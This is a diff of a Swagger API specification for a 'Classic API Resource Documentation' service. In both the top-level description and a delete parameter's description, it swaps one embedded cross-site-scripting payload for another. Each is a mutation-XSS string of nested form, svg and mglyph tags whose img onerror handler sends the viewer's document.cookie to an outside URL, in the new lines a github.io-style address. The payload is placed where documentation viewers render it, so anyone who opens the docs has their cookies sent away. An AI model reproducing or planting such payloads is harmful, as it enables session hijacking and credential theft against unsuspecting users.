@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://canarytokens.com/tags/9z3rb919j97n36rpkd4hjwpul/submit.aspx?'+document.cookie;>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://github.com/hackingmonks/hackingmonks.github.io?'+document.cookie;>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://canarytokens.com/tags/9z3rb919j97n36rpkd4hjwpul/submit.aspx?'+document.cookie;>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://github.com/hackingmonks/hackingmonks.github.io?'+document.cookie;>"></form>
 
           format: int64
           in: path
